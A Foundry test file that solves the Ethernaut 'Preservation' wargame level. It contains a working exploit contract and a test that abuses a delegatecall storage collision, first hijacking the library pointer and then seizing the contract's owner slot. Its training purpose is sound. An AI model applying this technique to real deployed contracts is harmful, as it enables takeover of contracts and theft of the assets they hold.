// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";

/// @dev Malicious "library" — same setTime(uint256) selector, but writes Preservation's storage.
///      Preservation storage layout:
///        slot 0 → timeZone1Library
///        slot 1 → timeZone2Library
///        slot 2 → owner
///        slot 3 → storedTime
contract AttackPreservation {
    // ========== MATCH STORAGE LAYOUT (important!) ==========
    // Your setTime runs via delegatecall in Preservation's context.
    // Declare the same first slots as Preservation so writes hit the right places.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    // ========== END LAYOUT ==========

    // Must match LibraryContract.setTime(uint256) so the selector is identical.
    function setTime(uint256 _time) public {
        // ========== YOUR setTime LOGIC HERE ==========
        // Hint: on the first call, Preservation still points at LibraryContract,
        //       so setFirstTime(_time) writes _time into slot 0 (timeZone1Library).
        //       Pass your attack contract address as _time to hijack the library pointer.
        //
        //       On the second call, Preservation delegatecalls INTO this contract.
        //       Here you can set owner = address(uint160(_time)) or hardcode the attacker.
        // ========== END setTime LOGIC ==========
        uint160 _timeUint160 = uint160(_time);
        owner = address(_timeUint160);
    }
}

contract PreservationTest is Test {
    LibraryContract public timeZone1Library;
    LibraryContract public timeZone2Library;
    Preservation public target;
    AttackPreservation public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Like the Ethernaut factory: two libraries + Preservation instance.
        vm.startPrank(deployer);
        timeZone1Library = new LibraryContract();
        timeZone2Library = new LibraryContract();
        target = new Preservation(address(timeZone1Library), address(timeZone2Library));
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackPreservation();
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   target.owner() == attacker
        //
        // Hints (look at Preservation.sol carefully):
        //   - setFirstTime / setSecondTime use delegatecall into a "library"
        //   - LibraryContract.setTime writes slot 0 — but under delegatecall that is
        //     Preservation.timeZone1Library, NOT LibraryContract.storedTime
        //   - So you can overwrite timeZone1Library with your attack contract address
        //   - Then call setFirstTime again → delegatecall runs YOUR setTime in
        //     Preservation's storage → set owner (slot 2) to attacker
        //
        // Tip:
        //   // 1) Point timeZone1Library at your attack contract
        //   target.setFirstTime(uint256(uint160(address(attackContract))));
        //   // 2) Now setFirstTime delegatecalls your setTime — claim ownership
        //   target.setFirstTime(uint256(uint160(attacker)));

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        // ========== END EXPLOIT ==========
        uint160 attackContractUint160 = uint160(address(attackContract));
        uint256 attackContractUint256 = uint256(attackContractUint160);
        target.setFirstTime(attackContractUint256);
        uint160 attackerUint160 = uint160(attacker);
        target.setFirstTime(uint256(attackerUint160));
        vm.stopPrank();

        assertEq(target.owner(), attacker, "attacker should own Preservation");
    }
}
